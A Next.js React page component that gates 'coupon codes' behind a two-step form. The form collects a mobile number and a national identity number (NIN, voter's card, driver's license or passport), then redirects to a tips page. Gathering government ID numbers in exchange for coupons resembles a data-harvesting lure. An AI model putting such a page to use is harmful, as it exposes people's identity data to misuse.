"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
import { ShieldCheck, ChevronDown, Loader2, AlertCircle } from "lucide-react";

export default function GatePage() {
  const router = useRouter();
  const [step, setStep] = useState(1); // 1 = Phone/ID, 2 = Verify ID Type
  
  const [mobile, setMobile] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [idType, setIdType] = useState("NIN");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  // STEP 1 SUBMIT
  const handleStep1 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    // Save to DB and get a temporary token
    const result = await submitGateForm(mobile, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      setStep(2); // Move to step 2
      setLoading(false);
    }
  };

  // STEP 2 SUBMIT
  const handleStep2 = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    // Save ID type to DB, set gate_token cookie, and redirect
    const result = await submitVerificationForm(idType, idNumber);
    
    if (result?.error) {
      setError(result.error);
      setLoading(false);
    } else {
      // Push to tips page. The proxy will read the cookie we just set.
      router.push("/tips?reviewing=true");
    }
  };

  return (
    <div className="min-h-screen bg-bg-deep flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-bg-slate rounded-2xl border border-gray-700 p-8 shadow-2xl relative overflow-hidden">
        
        {/* Glow Effect */}
        <div className="absolute top-0 right-0 w-32 h-32 bg-brand-green/10 rounded-full blur-3xl" />

        <div className="flex flex-col items-center mb-8 relative z-10">
          <div className="w-16 h-16 bg-brand-green/10 rounded-full flex items-center justify-center mb-4">
            <ShieldCheck className="w-8 h-8 text-brand-green" />
          </div>
          <h1 className="text-2xl font-extrabold text-surface-white text-center">
            {step === 1 ? "Access Coupon Codes" : "Verify Identity"}
          </h1>
          <p className="text-text-muted text-sm mt-2 text-center">
            {step === 1 
              ? "Enter your mobile number and ID to begin." 
              : "Select your ID type and enter the exact ID number."}
          </p>
        </div>

        {error && (
          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-lg mb-6 flex items-center gap-2">
            <AlertCircle size={16} /> {error}
          </div>
        )}

        {/* STEP 1 FORM */}
        {step === 1 && (
          <form onSubmit={handleStep1} className="flex flex-col gap-4 relative z-10">
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Mobile Number</label>
              <input
                type="tel" required value={mobile} onChange={(e) => setMobile(e.target.value)}
                placeholder="e.g. 08012345678"
                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
              />
            </div>
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Primary ID Number</label>
              <input
                type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
                placeholder="Enter your ID number"
                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
              />
            </div>
            <button type="submit" disabled={loading}
              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
            </button>
          </form>
        )}

        {/* STEP 2 FORM */}
        {step === 2 && (
          <form onSubmit={handleStep2} className="flex flex-col gap-4 relative z-10">
            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">Select ID Type</label>
              <div className="relative">
                <select 
                  value={idType} onChange={(e) => setIdType(e.target.value)}
                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-4 pr-10 text-surface-white appearance-none focus:outline-none focus:border-brand-green cursor-pointer"
                >
                  <option value="NIN">National Identity Number (NIN)</option>
                  <option value="Voter's Card">Permanent Voter's Card</option>
                  <option value="Driver's License">Driver's License</option>
                  <option value="International Passport">International Passport</option>
                </select>
                <ChevronDown className="absolute right-3 top-3.5 text-text-muted w-5 h-5 pointer-events-none" />
              </div>
            </div>

            <div className="flex flex-col gap-2">
              <label className="text-sm text-text-muted font-medium">{idType} Number</label>
              <input
                type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
                placeholder={`Enter your ${idType} number`}
                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
              />
            </div>

            <button type="submit" disabled={loading}
              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
            </button>
          </form>
        )}

      </div>
    </div>
  );
}
